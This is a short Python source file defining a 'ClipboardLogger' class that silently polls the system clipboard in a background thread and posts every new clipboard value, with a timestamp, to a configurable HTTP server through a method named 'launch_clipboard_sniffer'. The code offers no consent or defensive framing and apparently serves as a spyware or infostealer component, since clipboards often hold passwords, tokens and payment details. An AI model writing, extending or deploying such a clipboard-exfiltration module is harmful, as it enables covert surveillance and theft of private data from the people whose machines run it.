import pyperclip
import time
import threading
import requests
import json
from datetime import datetime

class ClipboardLogger:
    def __init__(self, interval=5, server_ip="127.0.0.1", port=8080,):
        self.interval = interval
        self.server_ip = server_ip
        self.port = port
        self.previous_clipboard = ""

    def _post_clipboard_data(self, clipboard_text):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload = json.dumps({
            "timestamp": timestamp,
            "clipboardData": clipboard_text
        })

        try:
            requests.post(
                f"http://{self.server_ip}:{self.port}/clipboard",
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            print(f"[Clipboard] Sent: {clipboard_text}")
        except Exception as e:
            print(f"[Clipboard Error] {e}")

    def launch_clipboard_sniffer(self):
        def loop():
            while True:
                try:
                    current = pyperclip.paste()
                    if current.strip() and current != self.previous_clipboard:
                        self.previous_clipboard = current
                        self._post_clipboard_data(current)
                except Exception as e:
                    print(f"[Clipboard Read Error] {e}")
                time.sleep(self.interval)

        threading.Thread(target=loop, daemon=True).start()